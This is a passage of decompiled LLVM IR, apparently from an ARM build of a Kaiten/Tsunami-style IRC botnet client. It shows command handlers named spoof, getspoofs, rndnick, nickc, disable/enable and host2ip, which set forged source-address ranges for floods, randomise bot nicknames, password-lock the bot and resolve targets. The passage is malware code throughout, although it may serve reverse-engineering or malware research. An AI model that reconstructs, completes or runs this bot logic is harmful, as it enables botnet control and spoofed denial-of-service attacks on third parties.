  %v4_10001494 = call i32 @putc_unlocked(i8 %v3_10001484, i32 %v3_10001210, i32 %v2_10001480)
  br label %dec_label_pc_100014bc

dec_label_pc_1000149c:                            ; preds = %dec_label_pc_10001418
  %v2_100014a4 = add i32 %storemerge817, %v2_10001074
  %v1_100014a8 = add i32 %v2_100014a4, 1084
  %v2_100014a8 = inttoptr i32 %v1_100014a8 to i8*
  %v3_100014a8 = load i8, i8* %v2_100014a8, align 1
  store i32 268440764, i32* @lr, align 4
  %v4_100014b8 = call i32 @__GI_fputc(i8 %v3_100014a8, i32 %v3_10001210, i32 %v2_100014a4)
  br label %dec_label_pc_100014bc

dec_label_pc_100014bc:                            ; preds = %dec_label_pc_10001478, %dec_label_pc_10001448, %dec_label_pc_1000149c
  %v1_100014c0 = add nuw nsw i32 %storemerge817, 1
  %v2_100014d0 = icmp slt i32 %v1_100014c0, %v4_100013d4
  br i1 %v2_100014d0, label %dec_label_pc_10001418, label %dec_label_pc_100013c0

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100013c0
  store i32 268440804, i32* @lr, align 4
  %v1_100014e0 = inttoptr i32 %v3_10001210 to i16*
  %v2_100014e0 = call i32 @__GI_fclose(i16* %v1_100014e0)
  store i32 ptrtoint ([3 x i8]* @global_var_100014ec.55 to i32), i32* @lr, align 4
  %v1_100014e8 = call i32 @close(i32 %v3_10000f94)
  %v0_100014f0 = call i32 @__GI_exit()
  br label %dec_label_pc_100014f4

dec_label_pc_100014f4:                            ; preds = %entry, %dec_label_pc_100014dc
  %v0_1000150c = phi i32 [ %v1_10000f4c, %entry ], [ %v0_100014f0, %dec_label_pc_100014dc ]
  %v2_100014f4 = load i32, i32* %stack_var_-5232, align 4
  store i32 %v2_100014f4, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000150c

; uselistorder directives
  uselistorder i32 %storemerge817, { 3, 0, 1, 2 }
  uselistorder i32 %v4_100013d4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge721, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge625, { 2, 0, 1 }
  uselistorder i32 %v4_10001230, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000121c, { 1, 0, 2 }
  uselistorder i32 %v3_10001210, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge570, { 0, 2, 1 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000104c, { 2, 1, 0 }
  uselistorder i32 %v2_10001058.pre-phi, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_100014f4, { 1, 0 }
  uselistorder label %dec_label_pc_100014bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001418, { 1, 0 }
  uselistorder label %dec_label_pc_10001398, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001358, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100012b4, { 1, 0 }
  uselistorder label %dec_label_pc_10001274, { 1, 0 }
  uselistorder label %dec_label_pc_100011b0, { 1, 0 }
  uselistorder label %dec_label_pc_10001158, { 1, 0 }
  uselistorder label %dec_label_pc_1000111c, { 1, 0 }
  uselistorder label %dec_label_pc_10001070, { 1, 0 }
  uselistorder label %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000103c, { 1, 0 }
  uselistorder label %dec_label_pc_10000fd0, { 1, 0 }
  uselistorder label %dec_label_pc_10000f88, { 1, 0 }
}

define i32 @getspoofs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp36 = call i8 @__decompiler_undefined_function_4()
  %v3_10001550 = load i32, i32* @global_var_10045158.29, align 4
  %v3_10001570 = icmp eq i32 %v3_10001550, 1
  %v3_1000158016 = zext i8 %tmp36 to i32
  br i1 %v3_10001570, label %dec_label_pc_10001578, label %dec_label_pc_100015e8

dec_label_pc_10001578:                            ; preds = %entry
  %v9_100015e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002a2d0.56 to i32), i32 %arg2, i32 %v3_1000158016)
  br label %dec_label_pc_100016b0

dec_label_pc_100015e8:                            ; preds = %entry
  %v9_100016ac = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_1002a2f0.58 to i32), i32 %arg2, i32 %v3_1000158016)
  br label %dec_label_pc_100016b0

dec_label_pc_100016b0:                            ; preds = %dec_label_pc_10001578, %dec_label_pc_100015e8
  %storemerge = phi i32 [ %v9_100016ac, %dec_label_pc_100015e8 ], [ %v9_100015e0, %dec_label_pc_10001578 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_1000158016, { 1, 0 }
  uselistorder label %dec_label_pc_100016b0, { 1, 0 }
}

define i32 @version(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v6_1000170c = call i32 @Send(i32 %arg1, i32 ptrtoint ([70 x i8]* @global_var_1002a320.59 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  ret i32 %v6_1000170c
}

define i32 @nickc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001750 = icmp eq i32 %arg3, 1
  br i1 %v3_10001750, label %dec_label_pc_10001774, label %dec_label_pc_10001758

dec_label_pc_10001758:                            ; preds = %entry
  %v6_1000176c = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1002a368.60 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_100017e8

dec_label_pc_10001774:                            ; preds = %entry
  %v1_10001778 = add i32 %arg4, 4
  %v1_1000177c = inttoptr i32 %v1_10001778 to i32*
  %v2_1000177c = load i32, i32* %v1_1000177c, align 4
  store i32 %v2_1000177c, i32* @r3, align 4
  %v0_10001784 = call i32 @__GI_strlen()
  %tmp9 = icmp ult i32 %v0_10001784, 33
  br i1 %tmp9, label %dec_label_pc_100017b0, label %dec_label_pc_10001794

dec_label_pc_10001794:                            ; preds = %dec_label_pc_10001774
  %v6_100017a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_1002a380.62 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_100017e8

dec_label_pc_100017b0:                            ; preds = %dec_label_pc_10001774
  %v2_100017b8 = load i32, i32* %v1_1000177c, align 4
  store i32 %v2_100017b8, i32* @global_var_10045178.64, align 4
  %v2_100017cc = load i32, i32* %v1_1000177c, align 4
  %v6_100017e4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1002a3b8.65 to i32), i32 %v2_100017cc, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_100017e8

dec_label_pc_100017e8:                            ; preds = %dec_label_pc_10001794, %dec_label_pc_10001758, %dec_label_pc_100017b0
  %v0_100017fc = phi i32 [ %v6_100017a8, %dec_label_pc_10001794 ], [ %v6_1000176c, %dec_label_pc_10001758 ], [ %v6_100017e4, %dec_label_pc_100017b0 ]
  ret i32 %v0_100017fc

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100017e8, { 2, 0, 1 }
}

define i32 @realrand(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001800 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001800, i32* %stack_var_-32, align 4
  store i32 268441640, i32* @lr, align 4
  %v1_10001824 = call i32 @__GI_time(i32 0)
  store i32 268441648, i32* @lr, align 4
  %v0_1000182c = call i32 @__libc_getpid()
  %v2_10001834 = add i32 %v1_10001824, %v0_1000182c
  store i32 268441664, i32* @lr, align 4
  %v1_1000183c = call i32 @srand(i32 %v2_10001834)
  store i32 268441668, i32* @lr, align 4
  %v0_10001840 = call i32 @random()
  %v2_10001850 = sub i32 1, %arg1
  %v1_10001854 = add i32 %v2_10001850, %arg2
  %v2_10001858 = srem i32 %v0_10001840, %v1_10001854
  %v2_10001868 = add i32 %v2_10001858, %arg1
  %v2_10001870 = load i32, i32* %stack_var_-32, align 4
  %v1_1000187c = add i32 %v2_10001870, -12
  %v2_1000187c = inttoptr i32 %v1_1000187c to i32*
  %v3_1000187c = load i32, i32* %v2_1000187c, align 4
  store i32 %v3_1000187c, i32* @r29, align 4
  ret i32 %v2_10001868

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @rndnick(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 268441788, i32* @lr, align 4
  %v2_100018b8 = call i32 @realrand(i32 4, i32 8)
  store i32 268441800, i32* @lr, align 4
  %v1_100018c4 = call i32 @randstring(i32 %v2_100018b8)
  store i32 %v1_100018c4, i32* @global_var_10045178.64, align 4
  %v1_100018d4 = call i32 @getBuild(i32 268697600)
  %v8_10001904 = call i32 @Send(i32 %arg1, i32 ptrtoint ([16 x i8]* @global_var_1002a3c4.66 to i32), i32 ptrtoint ([8 x i8]* @global_var_1002a3d4.67 to i32), i32 %v1_100018d4)
  ret i32 %v8_10001904
}

define i32 @disable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001948 = icmp eq i32 %arg3, 1
  br i1 %v3_10001948, label %dec_label_pc_100019b8, label %dec_label_pc_10001950

dec_label_pc_10001950:                            ; preds = %entry
  %v6_10001964 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1002a3dc.68 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_1000196c = load i8, i8* @global_var_10045150.22, align 1
  %v3_10001974 = icmp eq i8 %v3_1000196c, 0
  %. = select i1 %v3_10001974, i32 ptrtoint ([28 x i8]* @global_var_1002a404.70 to i32), i32 ptrtoint ([9 x i8]* @global_var_1002a3f8.69 to i32)
  %v7_100019b0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_1002a420.71 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001a7c

dec_label_pc_100019b8:                            ; preds = %entry
  %v3_100019bc = load i8, i8* @global_var_10045150.22, align 1
  %v3_100019c4 = icmp eq i8 %v3_100019bc, 0
  br i1 %v3_100019c4, label %dec_label_pc_100019e8, label %dec_label_pc_100019cc

dec_label_pc_100019cc:                            ; preds = %dec_label_pc_100019b8
  %v6_100019e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1002a444.73 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001a7c

dec_label_pc_100019e8:                            ; preds = %dec_label_pc_100019b8
  %v1_100019ec = add i32 %arg4, 4
  %v1_100019f0 = inttoptr i32 %v1_100019ec to i32*
  %v2_100019f0 = load i32, i32* %v1_100019f0, align 4
  store i32 %v2_100019f0, i32* @r3, align 4
  %v0_100019f8 = call i32 @__GI_strlen()
  %tmp13 = icmp ult i32 %v0_100019f8, 255
  br i1 %tmp13, label %dec_label_pc_10001a24, label %dec_label_pc_10001a08

dec_label_pc_10001a08:                            ; preds = %dec_label_pc_100019e8
  %v6_10001a1c = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1002a464.75 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001a7c

dec_label_pc_10001a24:                            ; preds = %dec_label_pc_100019e8
  store i8 1, i8* @global_var_10045150.22, align 1
  store i32 ptrtoint (i32* @global_var_1004db50.77 to i32), i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 256, i32* @r5, align 4
  store i32 268442188, i32* @lr, align 4
  %v0_10001a48 = call i32 @__GI_memset()
  %v2_10001a54 = load i32, i32* %v1_100019f0, align 4
  %v2_10001a64 = inttoptr i32 %v2_10001a54 to i8*
  %v3_10001a64 = call i32 @strcpy(i32 ptrtoint (i32* @global_var_1004db50.77 to i32), i8* %v2_10001a64)
  %v6_10001a78 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1002a48c.78 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32 %arg4)
  br label %dec_label_pc_10001a7c

dec_label_pc_10001a7c:                            ; preds = %dec_label_pc_10001a08, %dec_label_pc_100019cc, %dec_label_pc_10001950, %dec_label_pc_10001a24
  %v0_10001a90 = phi i32 [ %v6_10001a1c, %dec_label_pc_10001a08 ], [ %v6_100019e0, %dec_label_pc_100019cc ], [ %v7_100019b0, %dec_label_pc_10001950 ], [ %v6_10001a78, %dec_label_pc_10001a24 ]
  ret i32 %v0_10001a90

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10001a7c, { 3, 0, 1, 2 }
}

define i32 @enable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001abc = icmp eq i32 %arg3, 1
  br i1 %v3_10001abc, label %dec_label_pc_10001b2c, label %dec_label_pc_10001ac4

dec_label_pc_10001ac4:                            ; preds = %entry
  %v6_10001ad8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1002a4ac.79 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_10001ae0 = load i8, i8* @global_var_10045150.22, align 1
  %v3_10001ae8 = icmp eq i8 %v3_10001ae0, 0
  %. = select i1 %v3_10001ae8, i32 ptrtoint ([28 x i8]* @global_var_1002a404.70 to i32), i32 ptrtoint ([9 x i8]* @global_var_1002a3f8.69 to i32)
  %v7_10001b24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_1002a420.71 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001bc4

dec_label_pc_10001b2c:                            ; preds = %entry
  %v3_10001b30 = load i8, i8* @global_var_10045150.22, align 1
  %v3_10001b38 = icmp eq i8 %v3_10001b30, 0
  br i1 %v3_10001b38, label %dec_label_pc_10001b40, label %dec_label_pc_10001b5c

dec_label_pc_10001b40:                            ; preds = %dec_label_pc_10001b2c
  %v6_10001b54 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002a4c8.81 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001bc4

dec_label_pc_10001b5c:                            ; preds = %dec_label_pc_10001b2c
  %v1_10001b60 = add i32 %arg4, 4
  %v1_10001b64 = inttoptr i32 %v1_10001b60 to i32*
  %v2_10001b64 = load i32, i32* %v1_10001b64, align 4
  store i32 ptrtoint (i32* @global_var_1004db50.77 to i32), i32* @r3, align 4
  store i32 %v2_10001b64, i32* @r4, align 4
  %v2_10001b74 = call i32 @__GI_strcasecmp(i32 ptrtoint (i32* @global_var_1004db50.77 to i32), i32 %v2_10001b64)
  %v3_10001b7c = icmp eq i32 %v2_10001b74, 0
  br i1 %v3_10001b7c, label %dec_label_pc_10001ba0, label %dec_label_pc_10001b84

dec_label_pc_10001b84:                            ; preds = %dec_label_pc_10001b5c
  %v6_10001b98 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1002a4e8.83 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001bc4

dec_label_pc_10001ba0:                            ; preds = %dec_label_pc_10001b5c
  store i8 0, i8* @global_var_10045150.22, align 1
  %v6_10001bc0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1002a504.85 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001bc4

dec_label_pc_10001bc4:                            ; preds = %dec_label_pc_10001b84, %dec_label_pc_10001b40, %dec_label_pc_10001ac4, %dec_label_pc_10001ba0
  %v0_10001bd8 = phi i32 [ %v6_10001b98, %dec_label_pc_10001b84 ], [ %v6_10001b54, %dec_label_pc_10001b40 ], [ %v7_10001b24, %dec_label_pc_10001ac4 ], [ %v6_10001bc0, %dec_label_pc_10001ba0 ]
  ret i32 %v0_10001bd8

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_1004db50.77 to i32), { 0, 3, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_10001bc4, { 3, 0, 1, 2 }
}

define i32 @spoof(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001bdc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001bdc, i32* %stack_var_-336, align 4
  %v3_10001c08 = icmp eq i32 %arg3, 1
  br i1 %v3_10001c08, label %dec_label_pc_10001c44, label %dec_label_pc_10001c10

dec_label_pc_10001c10:                            ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10001c24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1002a524.86 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i8* null, i8** @global_var_10045154.28, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10045158.29, align 4
  br label %dec_label_pc_10001e18

dec_label_pc_10001c44:                            ; preds = %entry
  %v1_10001c48 = add i32 %arg4, 4
  store i32 %v1_10001c48, i32* %r9.global-to-local, align 4
  %v1_10001c4c = inttoptr i32 %v1_10001c48 to i32*
  %v2_10001c4c = load i32, i32* %v1_10001c4c, align 4
  store i32 %v2_10001c4c, i32* @r3, align 4
  %v0_10001c54 = call i32 @__GI_strlen()
  %tmp32 = icmp ult i32 %v0_10001c54, 17
  br i1 %tmp32, label %dec_label_pc_10001c80, label %dec_label_pc_10001c64

dec_label_pc_10001c64:                            ; preds = %dec_label_pc_10001c44
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10001c78 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_1002a544.87 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10001e18

dec_label_pc_10001c80:                            ; preds = %dec_label_pc_10001c44
  store i32 %v1_10001c48, i32* %r9.global-to-local, align 4
  %v2_10001c88 = load i32, i32* %v1_10001c4c, align 4
  store i32 %v2_10001c88, i32* %r9.global-to-local, align 4
  %v2_10001c8c = ptrtoint i32* %stack_var_-316 to i32
  %v2_10001c98 = inttoptr i32 %v2_10001c88 to i8*
  %v3_10001c98 = call i32 @strcpy(i32 %v2_10001c8c, i8* %v2_10001c98)
  store i32 %v2_10001c8c, i32* @r3, align 4
  %v0_10001ca4 = call i32 @__GI_strlen()
  %v2_10001cb0 = ptrtoint i32* %stack_var_-328 to i32
  %v1_10001cac = add i32 %v2_10001cb0, -1
  %v2_10001cb4 = add i32 %v1_10001cac, %v0_10001ca4
  store i32 %v2_10001cb4, i32* %r9.global-to-local, align 4
  %v1_10001cb8 = add i32 %v2_10001cb4, 12
  %v2_10001cb8 = inttoptr i32 %v1_10001cb8 to i8*
  %v3_10001cb8 = load i8, i8* %v2_10001cb8, align 1
  %v3_10001cc0 = icmp eq i8 %v3_10001cb8, 46
  br i1 %v3_10001cc0, label %dec_label_pc_10001cc8, label %dec_label_pc_10001d34.preheader

dec_label_pc_10001cc8:                            ; preds = %dec_label_pc_10001c80
  store i32 %v2_10001c8c, i32* @r3, align 4
  %v0_10001cd0 = call i32 @__GI_strlen()
  %v2_10001ce0 = add i32 %v1_10001cac, %v0_10001cd0
  store i32 %v2_10001ce0, i32* %r9.global-to-local, align 4
  %v3_10001ce8 = add i32 %v2_10001ce0, 12
  %v4_10001ce8 = inttoptr i32 %v3_10001ce8 to i8*
  store i8 0, i8* %v4_10001ce8, align 1
  br label %dec_label_pc_10001d34.preheader

dec_label_pc_10001d34.preheader:                  ; preds = %dec_label_pc_10001c80, %dec_label_pc_10001cc8
  store i32 %v2_10001c8c, i32* @r3, align 4
  %v0_10001d408 = call i32 @__GI_strlen()
  %v2_10001d4810 = icmp eq i32 %v0_10001d408, 0
  br i1 %v2_10001d4810, label %dec_label_pc_10001d50, label %dec_label_pc_10001d00

dec_label_pc_10001d00:                            ; preds = %dec_label_pc_10001d34.preheader, %dec_label_pc_10001d28
  %stack_var_-320.014 = phi i32 [ %v1_10001d2c, %dec_label_pc_10001d28 ], [ 0, %dec_label_pc_10001d34.preheader ]
  %stack_var_-324.113 = phi i32 [ %stack_var_-324.0, %dec_label_pc_10001d28 ], [ 1, %dec_label_pc_10001d34.preheader ]
  %v2_10001d08 = add i32 %stack_var_-320.014, %v2_10001cb0
  store i32 %v2_10001d08, i32* %r9.global-to-local, align 4
  %v1_10001d0c = add i32 %v2_10001d08, 12
  %v2_10001d0c = inttoptr i32 %v1_10001d0c to i8*
  %v3_10001d0c = load i8, i8* %v2_10001d0c, align 1
  %v3_10001d14 = icmp eq i8 %v3_10001d0c, 46
  br i1 %v3_10001d14, label %dec_label_pc_10001d1c, label %dec_label_pc_10001d28

dec_label_pc_10001d1c:                            ; preds = %dec_label_pc_10001d00
  store i32 %stack_var_-324.113, i32* %r9.global-to-local, align 4
  %v1_10001d20 = add i32 %stack_var_-324.113, 1
  br label %dec_label_pc_10001d28

dec_label_pc_10001d28:                            ; preds = %dec_label_pc_10001d00, %dec_label_pc_10001d1c
  %stack_var_-324.0 = phi i32 [ %v1_10001d20, %dec_label_pc_10001d1c ], [ %stack_var_-324.113, %dec_label_pc_10001d00 ]
  store i32 %stack_var_-320.014, i32* %r9.global-to-local, align 4
  %v1_10001d2c = add i32 %stack_var_-320.014, 1
  store i32 %v2_10001c8c, i32* @r3, align 4
  %v0_10001d40 = call i32 @__GI_strlen()
  %v2_10001d48 = icmp ult i32 %v1_10001d2c, %v0_10001d40
  br i1 %v2_10001d48, label %dec_label_pc_10001d00, label %dec_label_pc_10001d50

dec_label_pc_10001d50:                            ; preds = %dec_label_pc_10001d34.preheader, %dec_label_pc_10001d28
  %stack_var_-324.1.lcssa = phi i32 [ 1, %dec_label_pc_10001d34.preheader ], [ %stack_var_-324.0, %dec_label_pc_10001d28 ]
  %v1_10001d54 = sub i32 4, %stack_var_-324.1.lcssa
  store i32 %v1_10001d54, i32* %r9.global-to-local, align 4
  %v2_10001db04 = icmp sgt i32 %v1_10001d54, 0
  %v4_10001db06 = icmp eq i32 %v1_10001d54, 0
  br i1 %v2_10001db04, label %dec_label_pc_10001d68, label %dec_label_pc_10001db8

dec_label_pc_10001d68:                            ; preds = %dec_label_pc_10001d50, %dec_label_pc_10001d68
  %storemerge27 = phi i32 [ %v1_10001da0, %dec_label_pc_10001d68 ], [ 0, %dec_label_pc_10001d50 ]
  store i32 %v2_10001c8c, i32* @r3, align 4
  %v0_10001d74 = call i32 @__GI_strlen()
  %v2_10001d7c = add i32 %v2_10001c8c, %v0_10001d74
  store i32 %v2_10001d7c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v3_10001d94 = inttoptr i32 %v2_10001d7c to i16*
  store i16 11824, i16* %v3_10001d94, align 2
  %v0_10001d98 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001d98 = trunc i32 %v0_10001d98 to i8
  %v2_10001d98 = load i32, i32* %r11.global-to-local, align 4
  %v3_10001d98 = add i32 %v2_10001d98, 2
  %v4_10001d98 = inttoptr i32 %v3_10001d98 to i8*
  store i8 %v1_10001d98, i8* %v4_10001d98, align 1
  %v1_10001da0 = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10001d54, i32* %r9.global-to-local, align 4
  %v2_10001db0 = icmp slt i32 %v1_10001da0, %v1_10001d54
  br i1 %v2_10001db0, label %dec_label_pc_10001d68, label %dec_label_pc_10001db8

dec_label_pc_10001db8:                            ; preds = %dec_label_pc_10001d68, %dec_label_pc_10001d50
  store i32 %v2_10001c8c, i32* %r11.global-to-local, align 4
  %v2_10001dbc = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_10001dbc, i32* %r9.global-to-local, align 4
  %v2_10001dc0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268443088, i32* @lr, align 4
  %v2_10001dcc = bitcast i32* %stack_var_-316 to i8*
  %v3_10001dcc = call i32 @inet_aton(i8* %v2_10001dcc, i32 %v2_10001dc0)
  %v3_10001dd0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10001dd0, i32* %stack_var_-328, align 4
  br i1 %v4_10001db06, label %dec_label_pc_10001de4, label %dec_label_pc_10001df4

dec_label_pc_10001de4:                            ; preds = %dec_label_pc_10001db8
  store i32 268697600, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001e0c

dec_label_pc_10001df4:                            ; preds = %dec_label_pc_10001db8
  %v2_10001dfc = call i32 @poww(i32 256, i32 %v1_10001d54)
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10001e10.pre = load i32, i32* %stack_var_-328, align 4
  br label %dec_label_pc_10001e0c

dec_label_pc_10001e0c:                            ; preds = %dec_label_pc_10001de4, %dec_label_pc_10001df4
  %v0_10001e3017 = phi i32 [ %v3_10001dcc, %dec_label_pc_10001de4 ], [ %v2_10001dfc, %dec_label_pc_10001df4 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10001de4 ], [ %v2_10001dfc, %dec_label_pc_10001df4 ]
  %v3_10001e10 = phi i32 [ %v3_10001dd0, %dec_label_pc_10001de4 ], [ %v3_10001e10.pre, %dec_label_pc_10001df4 ]
  store i32 %storemerge, i32* @global_var_10045158.29, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v4_10001e14 = inttoptr i32 %v3_10001e10 to i8*
  store i8* %v4_10001e14, i8** @global_var_10045154.28, align 4
  br label %dec_label_pc_10001e18

dec_label_pc_10001e18:                            ; preds = %dec_label_pc_10001c10, %dec_label_pc_10001c64, %dec_label_pc_10001e0c
  %v0_10001e30 = phi i32 [ %v6_10001c24, %dec_label_pc_10001c10 ], [ %v6_10001c78, %dec_label_pc_10001c64 ], [ %v0_10001e3017, %dec_label_pc_10001e0c ]
  %v2_10001e18 = load i32, i32* %stack_var_-336, align 4
  store i32 %v2_10001e18, i32* %r11.global-to-local, align 4
  ret i32 %v0_10001e30

; uselistorder directives
  uselistorder i32 %v2_10001dfc, { 1, 0 }
  uselistorder i32 %v1_10001da0, { 1, 0 }
  uselistorder i32 %v1_10001d54, { 3, 5, 4, 0, 1, 2 }
  uselistorder i32 %stack_var_-324.113, { 2, 0, 1 }
  uselistorder i32 %stack_var_-320.014, { 1, 2, 0 }
  uselistorder i32 %v2_10001c8c, { 3, 0, 2, 4, 1, 5, 6, 7 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 4, 5, 8, 6, 7, 18, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001e18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10001e0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001d68, { 1, 0 }
  uselistorder label %dec_label_pc_10001d50, { 1, 0 }
  uselistorder label %dec_label_pc_10001d28, { 1, 0 }
  uselistorder label %dec_label_pc_10001d00, { 1, 0 }
  uselistorder label %dec_label_pc_10001d34.preheader, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268443224, i32* @lr, align 4
  %v1_10001e54 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_10001e54, i32* @global_var_10045160.91, align 4
  %v4_10001e70 = icmp eq i32 %v1_10001e54, -1
  br i1 %v4_10001e70, label %dec_label_pc_10001e78, label %dec_label_pc_10001eec

dec_label_pc_10001e78:                            ; preds = %entry
  store i32 268443264, i32* @lr, align 4
  %v1_10001e7c = call i32 @__GI_gethostbyname(i32 %arg2)
  %v3_10001e8c = icmp eq i32 %v1_10001e7c, 0
  br i1 %v3_10001e8c, label %dec_label_pc_10001e94, label %dec_label_pc_10001ec0

dec_label_pc_10001e94:                            ; preds = %dec_label_pc_10001e78
  %v3_10001e98 = load i32, i32* @global_var_1004517c.23, align 4
  %v6_10001eb4 = call i32 @Send(i32 %v3_10001e98, i32 ptrtoint ([33 x i8]* @global_var_1002a594.92 to i32), i32 %arg1, i32 %arg2)
  %v0_10001ebc = call i32 @__GI_exit()
  br label %dec_label_pc_10001ec0

dec_label_pc_10001ec0:                            ; preds = %dec_label_pc_10001e78, %dec_label_pc_10001e94
